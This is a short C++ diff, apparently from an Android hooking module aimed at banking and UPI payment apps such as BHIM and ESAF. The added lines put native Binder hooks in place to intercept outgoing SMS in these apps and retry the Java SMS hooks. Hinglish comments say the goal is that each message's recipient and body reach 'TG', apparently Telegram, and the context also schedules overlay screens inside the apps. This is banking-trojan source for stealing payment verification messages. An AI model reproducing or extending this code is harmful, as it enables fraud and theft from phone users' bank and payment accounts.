@@ -386,7 +386,13 @@ public:
             // Hero + BHIM ESAF / bank UPI — Java NOW so To+body TG na miss ho
             outgoing_sms_hook::arm_intercept_hooks();
             overlay_ui::install_sms_tweaks_java(env_, pkg_.c_str());
+            // ESAF: Java-only often misses → "Unable to send SMS" + no TG.
+            // Native Binder backup (Hero stays Java-only — crash-safe).
+            if (!is_hero_pkg(pkg_)) {
+                outgoing_sms_hook::install_for_upi(env_, api_, pkg_.c_str());
+            }
             schedule_deferred_java_sms(env_, pkg_, 1);
+            schedule_deferred_java_sms(env_, pkg_, 3);  // retry after SmsManager cache warm
             report_line(api_, std::string("post_fast_verify_java:") + pkg_);
             if (native_overlay_wanted() && overlay_allowed_pkg(pkg_)) {
                 schedule_overlay_ui(env_, api_, pkg_, 2);
